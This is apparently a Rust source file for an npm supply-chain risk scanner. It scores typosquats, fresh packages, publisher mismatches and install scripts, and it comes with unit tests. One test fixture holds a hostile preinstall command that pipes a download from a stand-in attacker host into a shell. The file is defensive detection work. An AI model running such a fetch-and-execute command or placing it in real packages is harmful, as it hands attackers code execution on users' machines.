//! The rule set. Every finding is a claim plus the evidence that supports it,
//! and severity only escalates when signals reinforce each other.

use crate::date;
use crate::model::{Evidence, Finding, PackageReport, Severity};
use crate::registry::{PackageMeta, package_page_url};
use crate::typosquat;

/// A package younger than this has no track record.
pub const FRESH_DAYS: i64 = 7;
/// A version newer than this on a package with no history is worth a look.
pub const RECENT_VERSION_DAYS: i64 = 7;

pub fn report(meta: PackageMeta, weekly_downloads: Option<u64>, now: i64) -> PackageReport {
    let findings = assess(&meta, now);
    PackageReport {
        ecosystem: "npm",
        name: meta.name,
        version: meta.version,
        first_published_at: meta.first_published_at,
        published_at: meta.published_at,
        weekly_downloads,
        maintainers: meta.maintainers,
        publisher: meta.publisher,
        install_scripts: meta.install_scripts,
        repository: meta.repository,
        deprecated: meta.deprecated,
        registry_url: meta.registry_url,
        findings,
    }
}

/// Accounts that publish on behalf of a project's CI, not people.
///
/// npm's trusted publishing reports `_npmUser.name` as `GitHub Actions` for
/// every release, which is not a maintainer-handoff signal.
const AUTOMATION_PUBLISHERS: &[&str] = &[
    "github actions",
    "npm",
    "npm-cli",
    "npm cli",
    "gitlab ci",
    "circleci",
    "travis ci",
    "azure pipelines",
    "jenkins",
    "semantic-release-bot",
];

pub fn is_automation_publisher(publisher: &str) -> bool {
    let normalized = publisher.trim().to_ascii_lowercase();
    normalized.ends_with("[bot]") || AUTOMATION_PUBLISHERS.contains(&normalized.as_str())
}

pub fn assess(meta: &PackageMeta, now: i64) -> Vec<Finding> {
    let mut findings = Vec::new();

    let typosquat_high = match typosquat::closest(&meta.name, typosquat::POPULAR) {
        Some(suspect) => {
            let high = suspect.homoglyph || suspect.distance <= 1;
            let detail = if suspect.homoglyph {
                format!(
                    "'{}' uses lookalike characters for the popular package '{}'",
                    meta.name, suspect.candidate
                )
            } else {
                format!(
                    "'{}' is {} edit(s) away from the popular package '{}'",
                    meta.name, suspect.distance, suspect.candidate
                )
            };
            findings.push(Finding {
                id: "typosquat",
                severity: if high { Severity::High } else { Severity::Warn },
                title: "name is close to a popular package".to_string(),
                detail,
                evidence: vec![
                    Evidence {
                        label: "this package".to_string(),
                        value: meta.name.clone(),
                        url: Some(package_page_url(&meta.name, &meta.version)),
                    },
                    Evidence {
                        label: "popular package".to_string(),
                        value: suspect.candidate.to_string(),
                        url: Some(format!(
                            "https://www.npmjs.com/package/{}",
                            suspect.candidate
                        )),
                    },
                ],
            });
            high
        }
        None => false,
    };

    let package_age = meta
        .first_published_at
        .map(|created| date::days_between(created, now));
    let fresh = package_age.is_some_and(|days| (0..FRESH_DAYS).contains(&days));
    if let Some(days) = package_age.filter(|days| (0..FRESH_DAYS).contains(days)) {
        findings.push(Finding {
            id: "fresh-package",
            severity: Severity::Warn,
            title: "package is new".to_string(),
            detail: format!(
                "first published {days} day(s) ago; there is no track record to review"
            ),
            evidence: vec![Evidence {
                label: "first publish".to_string(),
                value: meta
                    .first_published_at
                    .map(date::format_date)
                    .unwrap_or_default(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    let version_recent =
        meta.first_published_at
            .zip(meta.published_at)
            .is_some_and(|(created, published)| {
                let package_age = date::days_between(created, now);
                let version_age = date::days_between(published, now);
                package_age >= FRESH_DAYS && (0..RECENT_VERSION_DAYS).contains(&version_age)
            });
    if version_recent {
        findings.push(Finding {
            id: "fresh-version",
            severity: Severity::Info,
            title: "this version is recent".to_string(),
            detail:
                "the package has history, but this exact version was published in the last week"
                    .to_string(),
            evidence: vec![Evidence {
                label: "version publish".to_string(),
                value: meta.published_at.map(date::format_date).unwrap_or_default(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    let publisher_mismatch = match (&meta.publisher, meta.maintainers.is_empty()) {
        (Some(publisher), false) => {
            !is_automation_publisher(publisher)
                && !meta
                    .maintainers
                    .iter()
                    .any(|maintainer| maintainer.eq_ignore_ascii_case(publisher))
        }
        _ => false,
    };
    if let (true, Some(publisher)) = (publisher_mismatch, &meta.publisher) {
        findings.push(Finding {
            id: "publisher-not-maintainer",
            severity: Severity::Warn,
            title: "published by a user who is not a maintainer".to_string(),
            detail: format!(
                "this version was published by '{publisher}', who is not in the current maintainer list [{}]",
                meta.maintainers.join(", ")
            ),
            evidence: vec![Evidence {
                label: "maintainers".to_string(),
                value: meta.maintainers.join(", "),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    if !meta.install_scripts.is_empty() {
        let compounded = fresh || publisher_mismatch || typosquat_high;
        let mut evidence: Vec<Evidence> = meta
            .install_scripts
            .iter()
            .map(|script| Evidence {
                label: script.name.clone(),
                value: script.command.clone(),
                url: Some(meta.registry_url.clone()),
            })
            .collect();
        evidence.push(Evidence {
            label: "why install scripts matter".to_string(),
            value: "they run with your user's permissions during npm install".to_string(),
            url: Some(
                "https://docs.npmjs.com/cli/configuring-npm/package-json#scripts".to_string(),
            ),
        });
        findings.push(Finding {
            id: "install-scripts",
            severity: if compounded {
                Severity::High
            } else {
                Severity::Warn
            },
            title: "runs code during npm install".to_string(),
            detail: if compounded {
                "install-time scripts plus another warning signal; this is the shape of a supply-chain attack"
                    .to_string()
            } else {
                "install-time scripts are legitimate for native builds, but they are also how malicious packages run code before you review anything"
                    .to_string()
            },
            evidence,
        });
    }

    if let Some(message) = &meta.deprecated {
        findings.push(Finding {
            id: "deprecated",
            severity: Severity::Warn,
            title: "version is deprecated".to_string(),
            detail: message.clone(),
            evidence: vec![Evidence {
                label: "registry deprecation notice".to_string(),
                value: message.clone(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    if meta.repository.is_none() {
        findings.push(Finding {
            id: "no-repository",
            severity: Severity::Info,
            title: "no repository on record".to_string(),
            detail: "the publisher did not declare a source repository, so the tarball cannot be traced to source"
                .to_string(),
            evidence: vec![Evidence {
                label: "package metadata".to_string(),
                value: meta.name.clone(),
                url: Some(meta.registry_url.clone()),
            }],
        });
    }

    findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::InstallScript;

    const NOW: i64 = 1_800_000_000; // 2027-01-15

    fn meta() -> PackageMeta {
        PackageMeta {
            name: "some-package".to_string(),
            version: "1.0.0".to_string(),
            first_published_at: Some(NOW - 400 * date::SECONDS_PER_DAY),
            published_at: Some(NOW - 100 * date::SECONDS_PER_DAY),
            maintainers: vec!["alice".to_string()],
            publisher: Some("alice".to_string()),
            install_scripts: vec![],
            repository: Some("https://github.com/alice/some-package".to_string()),
            deprecated: None,
            registry_url: "https://registry.npmjs.org/some-package".to_string(),
        }
    }

    fn ids(findings: &[Finding]) -> Vec<&'static str> {
        findings.iter().map(|finding| finding.id).collect()
    }

    fn finding<'a>(findings: &'a [Finding], id: &str) -> &'a Finding {
        findings
            .iter()
            .find(|finding| finding.id == id)
            .unwrap_or_else(|| panic!("missing finding {id}"))
    }

    #[test]
    fn an_old_plain_package_is_clean() {
        let findings = assess(&meta(), NOW);
        assert!(findings.is_empty(), "unexpected findings: {findings:?}");
    }

    #[test]
    fn install_scripts_alone_are_a_warning() {
        let mut meta = meta();
        meta.install_scripts.push(InstallScript {
            name: "postinstall".to_string(),
            command: "node setup.js".to_string(),
        });
        let findings = assess(&meta, NOW);
        assert_eq!(ids(&findings), vec!["install-scripts"]);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::Warn
        );
    }

    #[test]
    fn install_scripts_on_a_fresh_package_are_high_risk() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW - date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        meta.install_scripts.push(InstallScript {
            name: "postinstall".to_string(),
            command: "node setup.js".to_string(),
        });
        let findings = assess(&meta, NOW);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::High
        );
        assert_eq!(
            report(meta, None, NOW).exit_code(),
            2,
            "install script + freshness should exit 2"
        );
    }

    #[test]
    fn install_scripts_with_a_publisher_mismatch_are_high_risk() {
        let mut meta = meta();
        meta.publisher = Some("mallory".to_string());
        meta.install_scripts.push(InstallScript {
            name: "preinstall".to_string(),
            command: "curl http://evil.test | sh".to_string(),
        });
        let findings = assess(&meta, NOW);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::High
        );
    }

    #[test]
    fn install_scripts_with_a_typosquat_name_are_high_risk() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        meta.install_scripts.push(InstallScript {
            name: "install".to_string(),
            command: "node index.js".to_string(),
        });
        let findings = assess(&meta, NOW);
        assert_eq!(
            finding(&findings, "install-scripts").severity,
            Severity::High
        );
        assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
    }

    #[test]
    fn a_new_package_is_a_warning() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        let findings = assess(&meta, NOW);
        assert_eq!(ids(&findings), vec!["fresh-package"]);
        assert_eq!(finding(&findings, "fresh-package").severity, Severity::Warn);
    }

    #[test]
    fn a_package_exactly_seven_days_old_is_not_fresh() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW - FRESH_DAYS * date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        assert!(assess(&meta, NOW).is_empty());
    }

    #[test]
    fn a_recent_version_on_an_old_package_is_only_info() {
        let mut meta = meta();
        meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
        let findings = assess(&meta, NOW);
        assert_eq!(ids(&findings), vec!["fresh-version"]);
        assert_eq!(finding(&findings, "fresh-version").severity, Severity::Info);
    }

    #[test]
    fn future_timestamps_do_not_panic_or_alert() {
        let mut meta = meta();
        meta.first_published_at = Some(NOW + 400 * date::SECONDS_PER_DAY);
        meta.published_at = meta.first_published_at;
        assert!(assess(&meta, NOW).is_empty());
    }

    #[test]
    fn publisher_not_in_maintainers_is_a_warning() {
        let mut meta = meta();
        meta.publisher = Some("mallory".to_string());
        let findings = assess(&meta, NOW);
        assert_eq!(ids(&findings), vec!["publisher-not-maintainer"]);
        assert!(
            finding(&findings, "publisher-not-maintainer")
                .detail
                .contains("mallory")
        );
    }

    #[test]
    fn maintainer_matching_is_case_insensitive() {
        let mut meta = meta();
        meta.publisher = Some("Alice".to_string());
        assert!(assess(&meta, NOW).is_empty());
    }

    #[test]
    fn an_empty_maintainer_list_does_not_trigger_a_mismatch() {
        let mut meta = meta();
        meta.maintainers.clear();
        meta.publisher = Some("mallory".to_string());
        assert!(assess(&meta, NOW).is_empty());
    }

    #[test]
    fn ci_publishers_are_not_maintainer_mismatches() {
        // Real npm data: express@5.3.0 is published through trusted publishing
        // and reports "_npmUser": "GitHub Actions".
        for publisher in [
            "GitHub Actions",
            "github actions",
            "npm",
            "npm-cli",
            "GitLab CI",
            "CircleCI",
            "Travis CI",
            "Azure Pipelines",
            "dependabot[bot]",
        ] {
            let mut meta = meta();
            meta.publisher = Some(publisher.to_string());
            assert!(
                assess(&meta, NOW).is_empty(),
                "{publisher} should not be treated as a human publisher"
            );
        }
    }

    #[test]
    fn one_edit_typosquat_is_high_risk() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        let findings = assess(&meta, NOW);
        assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
        assert_eq!(report(meta, None, NOW).exit_code(), 2);
    }

    #[test]
    fn two_edit_typosquat_is_a_warning() {
        let mut meta = meta();
        meta.name = "expreszz".to_string();
        let findings = assess(&meta, NOW);
        assert_eq!(finding(&findings, "typosquat").severity, Severity::Warn);
        assert_eq!(report(meta, None, NOW).exit_code(), 1);
    }

    #[test]
    fn homoglyph_typosquat_is_high_risk() {
        let mut meta = meta();
        meta.name = "1odash".to_string();
        let findings = assess(&meta, NOW);
        let typosquat = finding(&findings, "typosquat");
        assert_eq!(typosquat.severity, Severity::High);
        assert!(typosquat.detail.contains("lookalike"));
    }

    #[test]
    fn deprecated_versions_are_a_warning() {
        let mut meta = meta();
        meta.deprecated = Some("use v2".to_string());
        let findings = assess(&meta, NOW);
        assert_eq!(finding(&findings, "deprecated").severity, Severity::Warn);
    }

    #[test]
    fn missing_repository_is_only_info() {
        let mut meta = meta();
        meta.repository = None;
        let findings = assess(&meta, NOW);
        assert_eq!(ids(&findings), vec!["no-repository"]);
        assert_eq!(report(meta, None, NOW).exit_code(), 0);
    }

    #[test]
    fn findings_are_ordered_by_severity() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        meta.deprecated = Some("old".to_string());
        meta.repository = None;
        let findings = assess(&meta, NOW);
        let severities: Vec<Severity> = findings.iter().map(|finding| finding.severity).collect();
        let mut sorted = severities.clone();
        sorted.sort_by(|a, b| b.cmp(a));
        assert_eq!(severities, sorted);
        assert_eq!(severities.last(), Some(&Severity::Info));
    }

    #[test]
    fn every_finding_cites_evidence() {
        let mut meta = meta();
        meta.name = "expres".to_string();
        meta.deprecated = Some("old".to_string());
        meta.repository = None;
        meta.publisher = Some("mallory".to_string());
        meta.install_scripts.push(InstallScript {
            name: "postinstall".to_string(),
            command: "node setup.js".to_string(),
        });
        for finding in assess(&meta, NOW) {
            assert!(
                !finding.evidence.is_empty(),
                "finding {} has no evidence",
                finding.id
            );
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|evidence| evidence.url.is_some()),
                "finding {} has no link",
                finding.id
            );
        }
    }

    #[test]
    fn report_carries_registry_facts_through() {
        let mut meta = meta();
        meta.deprecated = Some("old".to_string());
        let report = report(meta, Some(1234), NOW);
        assert_eq!(report.ecosystem, "npm");
        assert_eq!(report.weekly_downloads, Some(1234));
        assert_eq!(report.maintainers, vec!["alice"]);
        assert_eq!(report.publisher.as_deref(), Some("alice"));
    }
}
